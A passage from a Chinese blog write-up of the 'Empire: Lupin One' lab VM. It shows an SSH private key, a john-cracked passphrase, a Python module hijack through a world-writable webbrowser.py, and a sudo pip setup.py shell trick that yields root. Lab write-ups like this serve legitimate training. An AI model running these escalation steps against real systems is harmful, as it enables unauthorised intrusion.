KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br>9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9<br>H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6<br>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu<br>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb<br>4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA<br>2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb<br>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ<br>0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft<br>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG<br>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm<br>8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br>63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br>8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ<br>E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br>5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br>1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<h2 id="破解秘钥"><a href="#破解秘钥" class="headerlink" title="破解秘钥"></a>破解秘钥</h2><p>先使用 ssh2john 把秘钥转换为 john 能识别的 hash ，然后再使用 john 工具和 fasttrack 字典进行密码破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># john --wordlist=/usr/share/wordlists/fasttrack.txt </span><br>Password files required, but none specified<br>                                                                                                                                                                <br>┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># john --wordlist=/usr/share/wordlists/fasttrack.txt johnkey </span><br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 16 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>P@55w0rd!        (sshkey)     <br>1g 0:00:00:03 DONE (2023-04-15 03:32) 0.3115g/s 19.93p/s 19.93c/s 19.93C/s Winter2015..password2<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>P@55w0rd! </p>
+<p>然后使用SSH秘钥进行登录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ ssh -i sshkey icex64@192.168.222.131<br>The authenticity of host <span class="hljs-string">&#x27;192.168.222.131 (192.168.222.131)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:GZOCytQu/pnSRRTMvJLagwz7ZPlJMDiyabwLvxTrKME.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.222.131<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="hljs-string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="hljs-string">Permissions 0644 for &#x27;</span>sshkey<span class="hljs-string">&#x27; are too open.</span><br><span class="hljs-string">It is required that your private key files are NOT accessible by others.</span><br><span class="hljs-string">This private key will be ignored.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415153900719.png" srcset="/img/loading.gif" lazyload alt="image-20230415153900719"></p>
+<p>改一下权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ ll<br>total 4<br>-rw-r--r-- 1 kali kali 3434 Apr 15 03:37 sshkey<br>                                                                                                                                                                <br>┌──(kali㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">chmod</span> 600 sshkey <br>                                                                                                                                                                <br>┌──(kali㉿kali)-[~/Desktop]<br>└─$ ll              <br>total 4<br>-rw------- 1 kali kali 3434 Apr 15 03:37 sshkey<br></code></pre></td></tr></table></figure>
+
+<p>再次登录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ ssh -i sshkey icex64@192.168.222.131<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;sshkey&#x27;</span>: <br>Linux LupinOne 5.10.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.46-5 (2021-09-23) x86_64</span><br><span class="hljs-comment">########################################</span><br>Welcome to Empire: Lupin One<br><span class="hljs-comment">########################################</span><br>Last login: Sat Apr 15 01:35:02 2023 from 192.168.222.128<br>icex64@LupinOne:~$ <span class="hljs-built_in">id</span><br>uid=1001(icex64) gid=1001(icex64) <span class="hljs-built_in">groups</span>=1001(icex64)<br></code></pre></td></tr></table></figure>
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>上传 LinEnum 进行信息收集：</p>
+<p>本机开启 http 服务，靶机下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:~$ <span class="hljs-built_in">cd</span> /tmp ; wget http://192.168.164.113:8000/LinEnum.sh<br>--2023-04-15 03:44:03--  http://192.168.164.113:8000/LinEnum.sh<br>Connecting to 192.168.164.113:8000... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 46631 (46K) [application/x-sh]<br>Saving to: ‘LinEnum.sh’<br><br>LinEnum.sh                              100%[===============================================================================&gt;]  45.54K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-04-15 03:44:03 (151 MB/s) - ‘LinEnum.sh’ saved [46631/46631]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ <span class="hljs-built_in">chmod</span> +x LinEnum.sh <br><br>icex64@LupinOne:/tmp$ ./LinEnum.sh &gt; icex64_info.txt<br><br>icex64@LupinOne:/tmp$ more icex64_info.txt <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] We can sudo without supplying a password!<br>Matching Defaults entries <span class="hljs-keyword">for</span> icex64 on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User icex64 may run the following commands on LupinOne:<br>    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415154822031.png" srcset="/img/loading.gif" lazyload alt="image-20230415154822031"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ <span class="hljs-built_in">ls</span> -l /home/arsene/heist.py<br>-rw-r--r-- 1 arsene arsene 118 Oct  4  2021 /home/arsene/heist.py<br><br>icex64@LupinOne:/tmp$ <span class="hljs-built_in">cat</span> /home/arsene/heist.py<br>import webbrowser<br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Its not yet ready to get in action&quot;</span>)<br><br>webbrowser.open(<span class="hljs-string">&quot;https://empirecybersecurity.co.mz&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>无权限修改 &#x2F;home&#x2F;arsene&#x2F;heist.py，但是它导入了 webbrowser 模块，看一下这个是否允许修改。</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415160005557.png" srcset="/img/loading.gif" lazyload alt="image-20230415160005557"></p>
+<p>找一下模块位置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ whereis /usr/bin/python3.9<br>python3: /usr/bin/python3.9-config /usr/bin/python3 /usr/bin/python3.9 /usr/lib/python3 /usr/lib/python3.9 /etc/python3 /etc/python3.9 /usr/local/lib/python3.9 /usr/include/python3.9 /usr/share/python3 /usr/share/man/man1/python3.1.gz<br><br>icex64@LupinOne:/tmp$ find /usr/lib/python3.9 -name webbrowser.py<br>/usr/lib/python3.9/webbrowser.py<br><br>icex64@LupinOne:/tmp$ <span class="hljs-built_in">ls</span> -l /usr/lib/python3.9/webbrowser.py<br>-rwxrwxrwx 1 root root 24112 Apr 15 01:50 /usr/lib/python3.9/webbrowser.py<br></code></pre></td></tr></table></figure>
+
+<p>有权限进行更改：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /usr/lib/python3.9/webbrowser.py<br><br>os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>获取 arsene 用户的 bash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">icex64@LupinOne:/tmp$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br><br>arsene@LupinOne:/tmp$ <span class="hljs-built_in">id</span><br>uid=1000(arsene) gid=1000(arsene) <span class="hljs-built_in">groups</span>=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br></code></pre></td></tr></table></figure>
+
+<p>再来一次信息收集：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">arsene@LupinOne:/tmp$ ./LinEnum.sh &gt; arsene_info.txt<br><br>arsene@LupinOne:/tmp$ more arsene_info.txt <br></code></pre></td></tr></table></figure>
+
+<p>还是这个问题：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] We can sudo without supplying a password!<br>Matching Defaults entries <span class="hljs-keyword">for</span> arsene on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User arsene may run the following commands on LupinOne:<br>    (root) NOPASSWD: /usr/bin/pip<br><br></code></pre></td></tr></table></figure>
+
+<p>sudo root 执行 &#x2F;usr&#x2F;bin&#x2F;pip</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415161213520.png" srcset="/img/loading.gif" lazyload alt="image-20230415161213520"></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415161225632.png" srcset="/img/loading.gif" lazyload alt="image-20230415161225632"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">arsene@LupinOne:/tmp$ TF=$(<span class="hljs-built_in">mktemp</span> -d)<br>arsene@LupinOne:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>arsene@LupinOne:/tmp$ sudo pip install <span class="hljs-variable">$TF</span><br>Processing ./tmp.Pd9QBrdUnh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="靶机总结"><a href="#靶机总结" class="headerlink" title="靶机总结"></a>靶机总结</h2><ol>
+<li>ffuf 爆破目录</li>
+<li>ssh 秘钥泄露 -&gt; ssh2john + john 破解密码</li>
+<li>ssh -i 秘钥 uname@host 使用秘钥登录</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">#靶机渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Empire_lupinone</div>
+      <div>https://fuyoumingyan.github.io/2023/05/29/靶机渗透/empire-lupinone/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>fuming</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/05/29/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/Git%E5%AD%A6%E4%B9%A0/" title="git 版本控制">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">git 版本控制</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/corrosion-2/" title="Corrosion-2">
+                        <span class="hidden-mobile">Corrosion-2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
